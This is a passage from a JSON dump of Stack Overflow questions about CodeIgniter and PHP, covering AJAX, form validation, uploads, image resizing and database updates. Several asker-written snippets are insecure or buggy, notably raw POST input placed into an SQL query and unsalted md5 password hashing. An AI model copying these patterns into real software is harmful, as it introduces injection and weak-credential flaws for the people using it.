data. I've even tried disabling the maximum script execution time for PHP, and it still errors out. Thank you so much for your help!</p>\n"},{"tags":["jquery","ajax","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12502016,"title":"Can't seem to return JSON in Codeigniter","body":"<p>On a hover event over a single item in a gallery I want to populate an info window with results from an AJAX call.  I'm new with CI and I can't seem to figure out why I can't make that work.  I have checked other posts.. no love.</p>\n\n<p>Can anybody point my error out to me?</p>\n\n<p>Here is my javascript function firing on a hover</p>\n\n<pre><code>function showDataWindow(){\n    $.post('index.php/home/getMoreInfo', { ID: thisID},\n        function(data) {\n             var moreInfo = $.parseJSON(data);\n             alert(data); // just checking\n             .. build my HTML with results and fade in ..\n});};\n</code></pre>\n\n<p>Here is the relevant method in my controller</p>\n\n<pre><code>public function getMoreInfo()\n{\n    $answer = \"unsigned\";\n    $ID = $_POST['ID'];\n    $this-&gt;load-&gt;model('Artist_model');\n    $assocReturned = $this-&gt;Artist_model-&gt;get_more_info($ID);\n    echo json_encode($assocReturned);\n}\n</code></pre>\n\n<p>And here is my Artist_model</p>\n\n<pre><code>public function get_more_info($ID)\n{\n    $query = $this-&gt;db-&gt;query(\"SELECT * FROM NOIRusers WHERE UID=$ID\");\n    $assoc = array();\n\n    foreach($query-&gt;results() as $r) // there should be only one result .. do this different?\n    {   \n        $assoc['memberID'] =$r['UID'];\n        $assoc['firstName'] =$r['UFname'];\n        $assoc['lastName'] =$r['ULname'];\n        .... a lot more like this ...\n    }\n    return $assoc;\n}\n</code></pre>\n\n<p>I keep getting a 500 (Internal Server Error).  I've got my Database library loaded btw.</p>\n\n<p>I think the problem is how I am handling my database response.  As I understand it .. $this->db->query() gives me a database object, which I then iterate into an associative array through the foreach.  I return that array to my controller which then json_encodes it and echoes it back to javascript.</p>\n\n<p>What am I not getting right?</p>\n"},{"tags":["php","html","codeigniter","google","codeigniter-2"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":1,"view_count":48,"score":-1,"question_id":12501549,"title":"How to implement google 2 step authentication in a web aplication made in codeigniter","body":"<p>How to implement google 2 step authentication in a web aplication made in codeigniter.</p>\n\n<p>I want to implement this api in my web application which is based on codeigniter. I need Tutorials and step by step guide how to do this. </p>\n\n<p>Thanks\nSomdeb</p>\n"},{"tags":["php","codeigniter","authentication"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":53,"score":2,"question_id":12498749,"title":"BitAuth Live Server Error","body":"<p>I have a local server, which is connected to my online database. I have been using bitAuth as my authentication method, and it was working all great, until I moved all my files onto my server.</p>\n\n<p>BitAuth comes with a default administrator account, admin(pw admin). I tried using this to sign in, but it returns an \"invalid username/password\".</p>\n\n<p>I saw someone else has mentioned a similar issue <a href=\"http://codeigniter.com/forums/viewthread/210884/\" rel=\"nofollow\">here</a>, but there isn't any solution.</p>\n"},{"tags":["php","xml","codeigniter","rest"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12494713,"title":"Codeigniter - Disallowed Key Characters when sending XML in RESTful server","body":"<p>I'm implementing a REST server with codeigniter and it includes a function where some XML will be posted to retrieve some data.</p>\n\n<p>The XML is passed through the body of the request and retrieved with:</p>\n\n<pre><code>$xml = file_get_contents('php://input');\n</code></pre>\n\n<p>The XML is then validated by this:</p>\n\n<pre><code>try\n{\n    $doc = new DOMDocument();\n    $doc-&gt;preserveWhiteSpace = FALSE;\n    $doc-&gt;loadXML($xml);\n    if ($doc-&gt;schemaValidate(APPPATH.'views/xml/xmlvalidate.xsd')) {\n        //--this is valid\n    }\n}\n</code></pre>\n\n<p>This works fine with the RESTclient in firefox, but when i use Advanced REST Client in chrome I get the \"disallowed key characters\" error, the offending string, as according to codeigniter, being:</p>\n\n<pre><code>&lt;?xml version\n</code></pre>\n\n<p>Anyone have any idea why it only works with firefox RESTclient? I need to get down to the cause of the problem in case it might error out in use after testing goes fine.</p>\n"},{"tags":["php","codeigniter","form-validation","input-validation"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":12501287,"title":"Validating 1 of 2 fields with Code Igniter Forms","body":"<p>I have a problem I'm trying to resolve in a bit of a cleaner way.  Basically what is happening is I have a form in which I have 2 fields and one or the other needs to be present for the form to be valid.  My problem is that if I mark the two fields as required, they will be required for the entire form entry process.</p>\n\n<pre><code>if ($this-&gt;input-&gt;post('field1'))\n{\n    make field1 required\n}\nelse if ($this-&gt;input-&gt;post('field2'))\n{\n    make field2 required\n}\nelse\n{\n    make field1 &amp;&amp; field2 required\n}\n</code></pre>\n\n<p>The problem lies with the else... If I make them both required; the first time it looks for errors it checks for both fields to be populated and if field1 is populated, field2 will show as being required when it really shouldn't and the error message will not go away after checking again.</p>\n\n<p>The other option is leaving field1 and 2 not required but that would mean that if they enter the correct info but leave both those fields blank it will submit.</p>\n\n<p>Any thoughts would be appreciated.</p>\n\n<p>** Notes: I believe I have resolved the issue, by setting both field1 + field2 to required on load, they update based on the users input and the click event on the submit button.</p>\n"},{"tags":["php","mvc","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12500771,"title":"Is loading a model within another CodeIgniter model appropriate?","body":"<p>I have an architectural question that has been bothering me. </p>\n\n<p>Codeigniter defines there <a href=\"http://codeigniter.com/user_guide/general/models.html\" rel=\"nofollow\">model</a> as such.  Now there are times when a model is closely tied to another.  I.e. User and Security.  </p>\n\n<p><strong>Is it bad practice to access another model within a model?</strong>  </p>\n\n<p>i.e. </p>\n\n<pre><code>class User extends CI_model \n{\n    function getUser() \n    {\n        $this-&gt;load-&gt;model('User');\n        $user = // load user \n\n        $this-&gt;load-&gt;model('Security');\n        $security = // load security\n\n        $user-&gt;security = $security;\n    }\n}\n</code></pre>\n\n<p>Some how it doesn't feel 'kosher' to me.   It feels like I need to have a DAO or some sort of DAL on top which can then load both models and do the necessary fetching while leaving the basic CRUD and model specific operations in the model.  And if we do create a separate layer, there doesn't seem like a logical place to put them in the Codeigniter framework.  </p>\n"},{"tags":["php","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12500524,"title":"Warning: Message: imagejpeg() [function.imagejpeg]: gd-jpeg: JPEG library reports unrecoverable error:","body":"<p>I am using codeigniter and am using a resize library to resize a bunch of image files in a folder. I am getting this error:     </p>\n\n<pre><code>Warning: Message: imagejpeg() [function.imagejpeg]: gd-jpeg: JPEG library reports unrecoverable error:  \n</code></pre>\n\n<p>On some images. I receive it on the first image it processes and the 48th image. Both files are not the largest nor the smallest files out of the files so its not based on file size. For the other images, it works perfectly with no errors.\nHere are my functions    </p>\n\n<pre><code>    function do_something()\n    {\n    $files = glob('temp/*.{jpg,png,gif}', GLOB_BRACE); \n    $this-&gt;load-&gt;model('photo_model', 'photo');\n    $count = 1;\n    $total = sizeof($files);\n    foreach($files as $file)\n    {\n\n        $name = explode(\"/\", $file);\n        //echo $name[1];\n        echo $count.\"/\".$total.\" filename: \".$name[1].\"&lt;br /&gt;\";\n        $count++;\n        flush();\n\n        $this-&gt;photo-&gt;make_thumb($file, 'photos/thumbs', $name[1], 300);\n\n        copy($file, 'photos/'.$name[1]);\n        unlink($file);\n\n    }\n    echo \"Done.\";\n}\n</code></pre>\n\n<p>And the following is from my photo model class. Again, this works for most files.</p>\n\n<pre><code>function make_thumb($src,$dest,$name,$size)\n{\n    /* read the source image */\n    ini_set('max_execution_time', 3600);\n    ini_set(\"memory_limit\",\"256M\");\n\n\n    $this-&gt;load-&gt;library('Resize');\n    $resize = new Resize();\n    $resize-&gt;reload($src);\n    $width = $resize-&gt;getSizeByFixedHeight($size);\n    $resize-&gt;resizeImage($width, $size, 'auto');\n    $resize-&gt;resizeImage($size, $size, 'crop'); \n    //$resize-&gt;resizeImage($size, $size, 'auto');   \n    $resize-&gt;saveImage($dest.\"/thumb_\".$name, 100);\n    $resize = null;\n    unset($resize);\n}\n</code></pre>\n"},{"tags":["php","mysql","debugging","codeigniter"],"answer_count":8,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":3059,"score":1,"question_id":4260625,"title":"How do you debug Code Igniter based PHP applications?","body":"<p>I followed steps in a tutorial to learn how to use Code Igniter to build a PHP/MySQL application and upon completion the application fails with no error.  I'm using TextMate rather than a full featured IDE.  </p>\n\n<p>How do most developers using Code Igniter debug their applications?  Is there something in the framework for bubbling errors and a stack trace into the browser session?  </p>\n\n<p>The specific problem I'd like to address now seems database related.  I configured my database, setup autoload.php, and created a controller and model for handling table data, and a view for presenting it.  From my accounts_model.php:</p>\n\n<pre><code> public function getData()  \n {\n     //Query the data table for every record and row\n     $query = $this-&gt;db-&gt;get('accounts');\n\n     if ($query-&gt;num_rows() &gt; 0)\n     {\n         show_error('Database is empty!');\n     }\n     else\n     {\n         return $query-&gt;result();\n     }\n }\n</code></pre>\n\n<p>When I run the application, I see \"An Error was Encountered\\nDatabase is empty!\".  Since I know the database is not empty and configuration is correct, I need something from the framework to give me a hint whether it is connecting to the database or why the query is empty.</p>\n"},{"tags":["php","codeigniter","post","character-encoding","replace"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":97,"score":1,"question_id":12497087,"title":"CodeIgniter replacing selected characters in all POST input","body":"<p>I'm planning to convert an existing intranet system to CodeIgniter. I've always used UTF-8 throughout so it can handle all sorts of different characters, this is essential for the system (outputting invoices, address labels etc).</p>\n\n<p>There's a few characters I decided to replace on input automatically as they often end up confusing the users of the system.</p>\n\n<ul>\n<li>Curly quotes, both single and double. Replaced with normal apostrophe/quotation marks</li>\n<li>En dash and em dash, replaced with a normal hyphen</li>\n<li>Ellipses, replaced with three full stops</li>\n</ul>\n\n<p>At least these punctuation symbols are now all used and stored consistently.</p>\n\n<p>Data that is to be stored in a database is always received by POST in this system, so I run the following function over the POST array on every page load...  </p>\n\n<pre><code>function nasty_chars_replace(&$var) {\n\n    $trans_table = array(\n        chr(0xe2).chr(0x80).chr(0x9a) => '\\'', //SINGLE LOW-9 QUOTATION MARK\n        chr(0xe2).chr(0x80).chr(0x9e) => '\"', //DOUBLE LOW-9 QUOTATION MARK\n        chr(0xe2).chr(0x80).chr(0xa6) => '...', //HORIZONTAL ELLIPSIS\n        chr(0xe2).chr(0x80).chr(0x98) => '\\'', //LEFT SINGLE QUOTATION MARK\n        chr(0xe2).chr(0x80).chr(0x99) => '\\'', //RIGHT SINGLE QUOTATION MARK\n        chr(0xe2).chr(0x80).chr(0x9c) => '\"', //LEFT DOUBLE QUOTATION MARK\n        chr(0xe2).chr(0x80).chr(0x9d) => '\"', //RIGHT DOUBLE QUOTATION MARK\n        chr(0xe2).chr(0x80).chr(0x93) => '-', //EN DASH\n        chr(0xe2).chr(0x80).chr(0x94) => '-' //EM DASH\n    );\n\n    foreach ($trans_table as $utf8_code => $replace) {\n        $var = str_replace($utf8_code, $replace, $var);\n    }\n\n    return trim($var);\n}\narray_walk_recursive($_POST, 'nasty_chars_replace');</code></pre>\n\n<p>Is there a method for doing something similar in CodeIgniter, globally on all POST data (if POST is present)?</p>\n\n<p>Does anyone else do anything like this?<br>\nAre there any other characters that are easily confused that I should consider \"cleansing\" (not sanitizing as such) for data consistency?<br>\n<strong>EDIT:</strong> Is this even a good idea?</p>\n\n<p><strong>EDIT 2:</strong> I should say that I also <code>trim()</code> all POST data as well to remove leading/trailing whitespace. So validation can fail if someone decides to just fill an input with whitespace.</p>\n"},{"tags":["codeigniter","cakephp","curl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":61,"score":-2,"question_id":12488858,"title":"I can't CURL CakePHP from outside","body":"<p>I just got some problem\nI tried to curl a website developed using CakePHP from my application (CodeIgniter), but it always returns null/empty result</p>\n\n<p>I've checked my codes, and I've tried to curl another website, and it works fine\nDoes it something in CakePHP that not allowed me to CURL it?</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":111,"score":1,"question_id":12483518,"title":"How to update database with form data","body":"<p>I am new to Code Igniter and I'm trying to update the user data from a form. Inserting, displaying and deleting data work fine, but I cannot get the update function to work.</p>\n\n<p>The data are saved in two tables: <code>users</code> and <code>users_info</code>.</p>\n\n<p><strong>My model:</strong></p>\n\n<pre><code>function getuser($id) {\n  $this-&gt;db-&gt;join('users_info','users.user_id = users_info.user');\n\n  $query = $this-&gt;db-&gt;get_where('users', array('user_id'=&gt; $id));\n\n  return $query-&gt;result_array();\n }\n\nfunction edituser($id) {\n\n  $update_user = array(\n    'username' =&gt; $this-&gt;input-&gt;post('username'),\n    'password' =&gt; md5($this-&gt;input-&gt;post('password')),     \n    'email' =&gt; $this-&gt;input-&gt;post('email'),\n    'level' =&gt; $this-&gt;input-&gt;post('role')                                       \n  );\n\n  $this-&gt;db-&gt;where('user_id', $id);\n  $this-&gt;db-&gt;join('users_info','users.user_id = users_info.user' );\n  $this-&gt;db-&gt;update('users', $update_user);\n\n  $affected_rows1 = $this-&gt;db-&gt;affected_rows() ? TRUE : FALSE;\n\n  $update_info = array(\n    'name' =&gt; $this-&gt;input-&gt;post('first_name'),\n    'surname' =&gt; $this-&gt;input-&gt;post('surname'),\n    'address' =&gt; $this-&gt;input-&gt;post('address'),         \n    'city' =&gt; $this-&gt;input-&gt;post('city'),\n    'phone' =&gt; $this-&gt;input-&gt;post('phone'),\n    'mobile' =&gt; $this-&gt;input-&gt;post('mobile'),\n    'am' =&gt; $this-&gt;input-&gt;post('am'),           \n    'vat' =&gt; $this-&gt;input-&gt;post('vat')                              \n  );\n\n  $this-&gt;db-&gt;where('user', $id);\n  $this-&gt;db-&gt;update('users_info', $update_info); \n  $affected_rows2 = $this-&gt;db-&gt;affected_rows() ? TRUE : FALSE;\n\n  return ($affected_rows1 &amp;&amp; $affected_rows2) ? TRUE : FALSE;\n\n}\n</code></pre>\n\n<p><strong>My Controller:</strong> </p>\n\n<pre><code>function edituser() {\n  if ($this-&gt;session-&gt;userdata('is_logged_in')) {\n    $this-&gt;load-&gt;helper('form');  \n    $this-&gt;load-&gt;helper('html');   \n    $this-&gt;load-&gt;model('users_model');\n    $id=$this-&gt;uri-&gt;segment(3);\n    $this-&gt;users_model-&gt;edituser($id);  \n\n  if ((int)$id &gt; 0) {\n\n    $query = $this-&gt;users_model-&gt;getuser($id);   \n\n    $data['fid']['value']         = $id;\n    $data['fusername']['value']   = $query['username'];\n    $data['fpassword']['value']   = $query['password'];\n    $data['femail']['value']      = $query['email'];\n    $data['frole']['value']       = $query['role'];\n    $data['ffirst_name']['value'] = $query['first_name'];\n    $data['fsurname']['value']    = $query['surname'];\n    $data['faddress']['value']    = $query['address'];\n    $data['fcity']['value']       = $query['city'];\n    $data['fphone']['value']      = $query['phone'];\n    $data['fmobile']['value']     = $query['mobile'];\n    $data['fam']['value']         = $query['am'];\n    $data['fvat']['value']        = $query['vat'];\n  }\n\n  $data['main_content'] = 'pages/edit_user';\n  $this-&gt;load-&gt;view('templates/template', $data);  \n\n  } else {\n    redirect('login/index');\n  }\n}\n</code></pre>\n\n<p><strong>My view</strong></p>\n\n<pre><code>&lt;div class=\"form-grid\"&gt;\n\n  &lt;?php\n    $attributes= array('class' =&gt; 'leftLabel', 'id' =&gt; 'form1');\n    echo form_open('users/edituser',  $attributes);\n  ?&gt;\n  &lt;? echo form_hidden('id',$fid['value']); ?&gt;\n\n  &lt;ul&gt;\n    &lt;li&gt;\n      &lt;label class=\"fldTitle\"&gt;Name&lt;abbr title=\"Required Field\" class=\"require\"&gt;*&lt;/abbr&gt;&lt;/label&gt;\n\n      &lt;div class =\"fieldwrap\"&gt;\n        &lt;span class=\"fldcol left\"&gt;\n        &lt;input name=\"ffirst_name\" type=\"text\" tabindex=\"13\" value=\"&lt;?php echo set_value('ffirst_name',$ffirst_name); ?&gt;\"class=\"full\"&gt;\n        &lt;label class=\"fldLabel\"&gt;First Name&lt;/label&gt;\n        &lt;?php echo form_error('first_name');   ?&gt;   \n        &lt;/span&gt;&lt;span class=\"fldcol right\"&gt;\n        &lt;input name=\"fsurname\" type=\"text\" tabindex=\"14\" value=\"&lt;?php echo set_value('fsurname'); ?&gt;\" class=\"full\"&gt;\n        &lt;label class=\"fldLabel\"&gt;Surname&lt;/label&gt;\n        &lt;?php echo form_error('surname');   ?&gt;   \n        &lt;/span&gt;\n      &lt;/div&gt;\n    &lt;/li&gt;\n    &lt;li&gt;\n      &lt;label class=\"fldTitle\"&gt;Login info&lt;abbr title=\"Required Field\" class=\"require\"&gt;*&lt;/abbr&gt;&lt;/label&gt;\n      &lt;div class =\"fieldwrap\"&gt;\n\n        &lt;span class=\"fldcol left\"&gt;\n          &lt;input name=\"username\" type=\"text\" tabindex=\"13\"  class=\"full\"&gt;\n          &lt;label class=\"fldLabel\"&gt;Username&lt;/label&gt;\n          &lt;?php echo form_error('username');   ?&gt;   \n        &lt;/span&gt;\n\n        &lt;span class=\"fldcol right\"&gt;\n\n        &lt;select name=\"role\" tabindex=\"12\" id=\"combobox\" value=\"&lt;?php echo set_value('role'); ?&gt;\"&gt;\n          &lt;option value=\"first\"&lt;?php echo set_select('role', 'first', TRUE); ?&gt;&gt;First&lt;/option&gt;\n          &lt;option value=\"second\"&lt;?php echo set_select('role', 'second'); ?&gt;&gt;Second&lt;/option&gt;\n          &lt;option value=\"third\"&lt;?php echo set_select('role', 'third'); ?&gt;&gt;Third&lt;/option&gt;\n        &lt;/select&gt;\n\n        &lt;label class=\"fldLabel\"&gt;Choose user role&lt;/label&gt;\n\n        &lt;?php echo form_error('role');   ?&gt; \n\n        &lt;/span&gt;&lt;span class=\"fldcol left\"&gt;\n\n        &lt;input name=\"password\" type=\"password\" tabindex=\"13\" class=\"full\"&gt;\n        &lt;label class=\"fldLabel\"&gt;Password&lt;/label&gt;\n        &lt;?php echo form_error('password');   ?&gt; \n\n        &lt;/span&gt; \n\n        &lt;span class=\"fldcol right\"&gt;\n          &lt;input name=\"password2\" type=\"password\" tabindex=\"13\" class=\"full\"&gt;\n          &lt;label class=\"fldLabel\"&gt;Comfirm Password&lt;/label&gt;\n          &lt;?php echo form_error('password2');   ?&gt;   \n        &lt;/span&gt;\n      &lt;/div&gt;\n    &lt;/li&gt;\n    &lt;li class=\"cmplxFld error\"&gt;\n      &lt;label class=\"fldTitle\"&gt;User info&lt;abbr title=\"Required Field\" class=\"require\"&gt;*&lt;/abbr&gt;&lt;/label&gt;\n      &lt;div class =\"fieldwrap\"&gt;\n        &lt;span class=\"full\"&gt;\n        &lt;input name=\"address\" type=\"text\" tabindex=\"15\" value=\"&lt;?php echo set_value('address'); ?&gt;\" class=\"full\"&gt;\n        &lt;label class=\"fldLabel\"&gt;Street Address&lt;/label&gt;\n        &lt;?php echo form_error('address');   ?&gt;   \n        &lt;/span&gt;\n        &lt;span class=\"fldcol left\"&gt;\n        &lt;input name=\"city\" type=\"text\" tabindex=\"17\" value=\"&lt;?php echo set_value('city'); ?&gt;\" class=\"full\"&gt;\n         &lt;label class=\"fldLabel\"&gt;City&lt;/label&gt;\n        &lt;?php echo form_error('city');   ?&gt; \n        &lt;/span&gt;\n         &lt;span class=\"fldcol right\"&gt;\n        &lt;input name=\"email\" type=\"text\" tabindex=\"18\" value=\"&lt;?php echo set_value('email'); ?&gt;\" class=\"full\"&gt;\n        &lt;label class=\"fldLabel\"&gt;email&lt;/label&gt;\n        &lt;?php echo form_error('email');   ?&gt;   \n        &lt;/span&gt;\n        &lt;/span&gt;\n        &lt;span class=\"fldcol left\"&gt;\n        &lt;input name=\"phone\" type=\"text\" tabindex=\"17\" value=\"&lt;?php echo set_value('phone'); ?&gt;\"  class=\"full\"&gt;\n        &lt;label class=\"fldLabel\"&gt;Phone&lt;/label&gt;\n        &lt;?php echo form_error('phone');   ?&gt;   \n        &lt;/span&gt;\n        &lt;span class=\"fldcol right\"&gt;\n        &lt;input name=\"mobile\" type=\"text\" tabindex=\"18\" value=\"&lt;?php echo set_value('mobile'); ?&gt;\" class=\"full\"&gt;\n        &lt;label class=\"fldLabel\"&gt;Mobile&lt;/label&gt;\n        &lt;?php echo form_error('mobile');   ?&gt;   \n        &lt;/span&gt;\n        &lt;/span&gt;\n        &lt;span class=\"fldcol left\"&gt;\n        &lt;input name=\"am\" type=\"text\" tabindex=\"17\" value=\"&lt;?php echo set_value('am'); ?&gt;\" class=\"full\"&gt;\n        &lt;label class=\"fldLabel\"&gt;AM&lt;/label&gt;\n        &lt;?php echo form_error('am');   ?&gt;   \n        &lt;/span&gt;\n        &lt;span class=\"fldcol right\"&gt;\n        &lt;input name=\"vat\" type=\"text\" tabindex=\"19\" value=\"&lt;?php echo set_value('vat'); ?&gt;\" class=\"full\"&gt;\n        &lt;label class=\"fldLabel\"&gt;VAT&lt;/label&gt;\n        &lt;?php echo form_error('vat');   ?&gt;   \n        &lt;/span&gt;\n      &lt;/div&gt;\n    &lt;/li&gt;\n    &lt;li class=\"buttons bottom-round noboder\"&gt;\n      &lt;div class =\"fieldwrap\"&gt;\n        &lt;input name=\"submit\" type=\"submit\" value=\"Submit\" class=\"submit-button\"&gt;\n      &lt;/div&gt;\n    &lt;/li&gt;\n  &lt;/ul&gt;\n\n&lt;/form&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>Could anyone please tell me what's wrong with my code?</p>\n"},{"tags":["php","validation","codeigniter","date-of-birth"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":136,"score":2,"question_id":12491674,"title":"PHP - codeigniter - control date format","body":"<p>I have a form using which users can edit their own birthdate, i save the birthdates in the DB in this format <code>15/24/1989</code> which is dd/mm/yyyy</p>\n\n<p>how can i check that the form birthday post value is formatted as shown?</p>\n\n<p>also what if i pass 12/00/hello ?</p>\n\n<p>i think i need numerics only and in a range of date 01 > dd &lt; 31 , 01 > mm &lt; 12 , 1920 > yyyy &lt; current_year –  </p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":12493210,"title":"File Upload & data entry using CodeIgniter's File Uploading Class","body":"<p>I am developing a form that allows the user to upload images as well as data. \nI have built forms before but am trying to integrate the file uploading class with my previous controller.</p>\n\n<p>Below is the Controller, Model &amp; Form from my View, can anyone help me tie up the missing link? I have searched all over &amp; not found a solution</p>\n\n<pre><code>class Canvas extends CI_Controller {\n\nfunction __construct() {\n    parent::__construct();\n                  $this-&gt;load-&gt;helper(array('form', 'url'));\n\n}\n\nfunction index() {\n            $vars = array();\n            $this-&gt;load-&gt;library('FacebookConnect');\n            $facebook=$this-&gt;facebookconnect-&gt;connect();\n            $vars['facebook'] = $facebook;\n            $user = $vars['user'] = $facebook-&gt;getUser();\n            $this-&gt;load-&gt;model('Users_Model'); \n            if($user != 0  &amp;&amp; sizeof($_POST)&gt;0) {\n                // user already set up. Show thank you page\n                $this-&gt;iterate_profile ($vars['user'],false,$_POST);\n                $this-&gt;load-&gt;view('upload_form',$vars);\n            } else {\n                // user not set, show welcome message\n                $this-&gt;load-&gt;view('canvas',$vars);\n            }\n\n}\n    function do_upload()\n    {\n        $config['upload_path'] = './uploads/';\n        $config['allowed_types'] = 'gif|jpg|png';\n        $config['max_size'] = '100';\n        $config['max_width']  = '1024';\n        $config['max_height']  = '768';\n\n        $this-&gt;load-&gt;library('upload', $config);\n\n        if ( ! $this-&gt;upload-&gt;do_upload())\n        {\n            $error = array('error' =&gt; $this-&gt;upload-&gt;display_errors());\n\n            $this-&gt;load-&gt;view('upload_form', $error);\n        }\n        else\n        {\n            $data = array('upload_data' =&gt; $this-&gt;upload-&gt;data());\n\n            $this-&gt;load-&gt;view('upload_success', $data);\n        }\n    }\n    function thank_you() {\n            $this-&gt;load-&gt;view('thank_you',$vars);\n    }\n\n    function remove() {\n            $vars = array();\n            $this-&gt;load-&gt;library('FacebookConnect');\n            $facebook=$this-&gt;facebookconnect-&gt;connect();\n            $vars['facebook'] = $facebook;\n            $vars['user'] = $facebook-&gt;getUser();\n            $this-&gt;load-&gt;model('Users_Model'); \n            if($vars['user'] == 0) {\n                // user not set, redirect\n                redirect('/', 'refresh');\n            } else {\n                // user already set up. Remove\n                $this-&gt;load-&gt;model('Users_Model'); \n                $this-&gt;Users_Model-&gt;remove($vars['user']);\n            }\n\n            $this-&gt;load-&gt;view('removed',$vars);\n    }\n\n    protected function iterate_profile ($user,$breadcrumb,$item) {\n\n        foreach($item as $key =&gt; $value) {\n            if(is_array($value)) {\n                $this-&gt;iterate_profile($user,$key,$value);\n            }\n            else {\n                if($breadcrumb) {\n                    //echo '[' . $breadcrumb . '_' . $key . ']= ' . $value . ' &lt;br /&gt;';\n                    $key = $breadcrumb . '_' . $key;\n                }\n\n                if( ! $this-&gt;Users_Model-&gt;exists($user,$key)) {\n                    // does not exist in the database, insert it\n                    $this-&gt;Users_Model-&gt;add($user,$key,$value);\n                } else {\n                    $this-&gt;Users_Model-&gt;update($user,$key,$value);\n                }\n            }\n        }\n    } \n</code></pre>\n\n<p>Model:</p>\n\n<pre><code>class Users_Model extends CI_Model {\nprotected $_name = 'users';\n\nfunction add($id,$key,$value) {\n    $data = array(\n       'id' =&gt; $id,\n       'name' =&gt; $key,\n       'value' =&gt; $value\n    );\n\n    return $this-&gt;db-&gt;insert($this-&gt;_name, $data); \n}\nfunction update($id,$key,$value) {\n    $data = array(\n       'value' =&gt; $value\n    );\n\n    $this-&gt;db-&gt;where(array(\n       'id' =&gt; $id,\n       'name' =&gt; $key\n    ));\n    return $this-&gt;db-&gt;update($this-&gt;_name, $data); \n}\n\nfunction exists($id,$key=null) {\n    if($key == null) {\n        $this-&gt;db-&gt;where(array(\n        'id' =&gt; $id\n        ));\n    } else {\n        $this-&gt;db-&gt;where(array(\n        'id' =&gt; $id,\n        'name' =&gt; $key\n        ));  \n    }\n\n    $query = $this-&gt;db-&gt;get($this-&gt;_name);\n    if($query-&gt;num_rows() &gt; 0) {\n        return true;\n    }\n    return false;\n}\n\nfunction remove($id) {\n    $data = array(\n       'id' =&gt; $id,\n    );\n\n    return $this-&gt;db-&gt;delete($this-&gt;_name, $data); \n}\n\nfunction all() {\n    $query = $this-&gt;db-&gt;get($this-&gt;_name);\n    $results = array();\n    if($query-&gt;num_rows() &gt; 0) {\n        foreach($query-&gt;result() as $row) {\n            $results[]=$row;\n        }\n    } \n    return $results;  \n}\n</code></pre>\n\n<p>}</p>\n\n<p>Form in view:</p>\n\n<pre><code>        &lt;form action=\"./\" method=\"post\" accept-charset=\"utf-8\" enctype=\"multipart/form-data\"&gt;\n              &lt;table&gt;\n                    &lt;tr&gt;&lt;td&gt;&lt;b class=\"ara\"&gt;XXXXXXXX&lt;/b&gt; &lt;input id=\"name\" type=\"text\" name=\"uid\" value=\"\" size=\"30\"&gt;&lt;/td&gt;&lt;/tr&gt;\n                    &lt;tr&gt;&lt;td&gt;&lt;b class=\"ara\"&gt;XXXXXXXX&lt;/b&gt;&lt;input id=\"dob\" type=\"text\" name=\"date_of_birth\" value=\"\" size=\"30\"&gt;&lt;/td&gt;&lt;/tr&gt;\n                    &lt;tr&gt;&lt;td&gt;&lt;b class=\"ara\" &gt;XXXXXXXX&lt;/b&gt;&lt;input id=\"email\" type=\"text\" name=\"email\" value=\"\" size=30&gt;&lt;/td&gt;&lt;/tr&gt;\n                    &lt;tr&gt;&lt;td&gt;&lt;b class=\"ara\"&gt;XXXXXXXX&lt;/b&gt; &lt;input id=\"tel\" type=\"text\" name=\"telephone\" value=\"\" size=\"30\"&gt;&lt;/td&gt;&lt;/tr&gt;\n                    &lt;tr&gt;&lt;td&gt;&lt;input type=\"radio\" name=\"device\" value=\"11\" checked&gt;&lt;b&gt;XXXXXXXX&lt;/b&gt;&lt;/input&gt;\n                                  &lt;input type=\"radio\" name=\"device\" value=\"305\"&gt;&lt;b&gt;XXXXXXXX&lt;/b&gt;&lt;/input&gt;\n                                  &lt;input type=\"radio\" name=\"device\" value=\"306\"&gt;&lt;b&gt;XXXXXXXX&lt;/b&gt;&lt;/input&gt;&lt;/td&gt;&lt;/tr&gt;\n                    &lt;tr&gt;&lt;td&gt;&lt;b&gt;XXXXXXXX&lt;/b&gt;&lt;select name=\"reason\"&gt; \n                    &lt;option value=\"volvo\"&gt;XXXXXXXX&lt;/option&gt; \n                    &lt;option value=\"saab\"&gt;XXXXXXXX&lt;/option&gt; \n                    &lt;option value=\"mercedes\"&gt;XXXXXXXX&lt;/option&gt; \n                    &lt;option value=\"audi\"&gt;XXXXXXXX&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;/tr&gt;\n                    &lt;tr&gt;&lt;td&gt;&lt;b&gt;XXXXXXXX&lt;/b&gt;&lt;select name=\"game\"&gt;\n                    &lt;option value=\"chuzzle\"&gt;XXXXXXXX&lt;/option&gt; \n                    &lt;option value=\"tetris\"&gt;XXXXXXXX&lt;/option&gt; \n                    &lt;option value=\"speed\"&gt;XXXXXXXX&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;/tr&gt;\n                    &lt;tr&gt;&lt;td&gt;&lt;input type=\"file\" name=\"userfile\" class=\"upload\" size=\"30\"/&gt;&lt;/td&gt;&lt;/tr&gt;\n                    &lt;tr&gt;&lt;td&gt;&lt;span class=\"ara tandc\"&gt;XXXXXXXX&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;input id=\"checkme\" type=\"checkbox\" class=\"check\" name=\"Check me\" value=\"Submit\"/&gt;&lt;/td&gt;&lt;/tr&gt;\n                    